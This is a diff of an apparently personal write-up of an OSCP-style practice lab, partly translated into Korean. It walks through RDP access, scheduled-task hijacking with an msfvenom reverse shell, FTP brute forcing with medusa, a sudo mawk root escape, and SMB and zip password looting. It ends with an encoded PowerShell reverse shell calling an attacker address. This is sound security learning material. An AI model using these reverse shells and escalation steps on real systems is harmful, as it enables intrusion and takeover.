@@ -238,27 +238,27 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 
 Initial credential (r.andrews:BusyOfficeWorker890)
 
-- RDP access
+- 처음에 RDP 접속
 
 `xfreerdp3 /v:192.168.123.206 /u:r.andrews /p:'BusyOfficeWorker890'` 
 
-In the Tasks folder, there is a schedule task.
+Tasks 폴더에 스케줄 작업이 있다.
 
 ![taskschedule](/images/etc/task_schedule.png)
 
-And the file name.
+파일 이름 확인
 
 ![taskschedule2](/images/etc/task_schedule2.png)
 
-There is write permission on this file.
+쓰기권한 확인
 
 ![writepermission](/images/etc/writepermission.png)
 
-Make a rev shell and wait for the connection.
+msfvenom으로 리버스쉘을 만든 후 배치.
 
 `msfvenom -p cmd/windows/reverse_powershell lhost=192.168.49.123 lport=443 > task.bat`
 
-After getting admin access, found the note.
+관리자 접속 후 notes.db 파일 발견.
 
 ```
 C:\Users\Administrator\Documents\Simple Sticky Notes>type notes.db
@@ -268,21 +268,117 @@ C:\Users\Administrator\Documents\Simple Sticky Notes>type notes.db
 svc_sql : SQLPoworiouse333
 ```
 
-The note mentions xp_cmdshell is available.
+xp_cmdshell도 사용가능하다고 적혀있다.
 
 ## 172.16.123.202 - SRV22
 
-Access with the mssql credential.
+mssql 크레덴셜로 접속
 
 `impacket-mssqlclient svc_sql:'SQLPowerHouse333'@172.16.123.202 -windows-auth`
 
-it needs port fowarding. At that time I failed at this point. (But now I can!)
+OSCPB였나 거기 내용이랑 똑같다. 이 당시에는 포트포워딩 할 줄 몰라서 여기서 끝났다.
 
 # Standalone machines
 
-## 112
+## 112 - Pwned
 
-ftp anonymous login -> found password list from the pdf file.
+ftp anonymous login -> 비밀번호 리스트가 적혀있는 pdf 파일 발견.
+
+![passwords](/images/etc/standalone/passwords.png)
+
+enum4linux로 유저 리스트 확인.
+
+`enum4linux 192.168.122.112`
+
+```sh
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1000 Unix User\sarah (Local User)
+S-1-22-1-1001 Unix User\nick (Local User)
+S-1-22-1-1002 Unix User\paul (Local User)
+S-1-22-1-1003 Unix User\linda (Local User)
+S-1-22-1-1004 Unix User\joe (Local User)
+```
+
+medusa로 크레덴셜 확인
+
+```sh
+medusa -h 192.168.122.112 -U users.txt -P passwords.txt -M ftp
+
+2026-03-07 15:15:26 ACCOUNT FOUND: [ftp] Host: 192.168.122.112 User: sarah Password: !Password-Reset0000 [SUCCESS]
+```
+
+ssh 로그인 성공.
+
+```sh
+sudo -l
+
+User sarah may run the following commands on oscp:
+    (ALL) NOPASSWD: /usr/bin/calendar
+    (ALL) NOPASSWD: /usr/bin/mcheck
+    (ALL) NOPASSWD: /usr/bin/mawk
+    (ALL) NOPASSWD: /usr/bin/rdma
+```
+
+```sh
+sudo  /usr/bin/mawk 'BEGIN {system("/bin/sh")}'
+```
+
+## 111 - local.txt
+
+feroxbuster로 `/launch` 디렉토리 발견.
+
+![launch](/images/etc/standalone/launch.png)
+
+Visit launch6 링크를 클릭하면 로그인 페이지가 나온다.
+
+크레덴셜은 SMB에서 얻을 수 있다.
+
+```sh
+smbclient -N -L //192.168.123.111
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        AnneAuto        Disk      Anne's Automatic BackUps
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+```
+
+```sh
+smbclient //192.168.123.111/AnneAuto
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Aug 24 11:12:37 2023
+  ..                                  D        0  Thu Aug 24 11:12:37 2023
+  emails.zip                          A    70052  Thu Aug 24 11:12:37 2023
+
+                10328063 blocks of size 4096. 5842420 blocks available
+smb: \> get emails.zip
+getting file \emails.zip of size 70052 as emails.zip (50.8 KiloBytes/sec) (average 50.8 KiloBytes/sec)
+```
+
+비밀번호가 걸려있기 때문에 `zip2john`
+
+크랙하면 비밀번호가 나온다. `1chief`
+
+파일이 잔뜩 있는데 grep으로 비밀번호가 적힌 파일을 찾을 수 있다.
+
+```
+grep -i password -r .
+./2023_Week38/20230922084703.msg:  The password will be our default one, used after a password reset: Voltaic1992
+```
+
+아까 발견한 로그인 페이지에 로그인한다.
+
+![powershell](/images/etc/standalone/powershell.png)
+
+로그인하면 파워쉘 창이 나오고 리버스쉘 코드를 보내서 연결할 수 있다.
+
+```
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+```
 
 
 
